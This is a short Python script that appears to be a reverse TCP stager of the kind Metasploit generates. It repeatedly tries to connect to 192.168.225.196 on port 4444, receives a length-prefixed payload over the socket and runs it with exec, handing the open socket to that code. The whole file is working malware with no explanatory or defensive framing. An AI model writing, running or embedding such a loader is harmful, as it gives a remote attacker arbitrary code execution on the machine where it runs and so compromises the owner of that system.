import socket,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('192.168.225.196',4444))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})

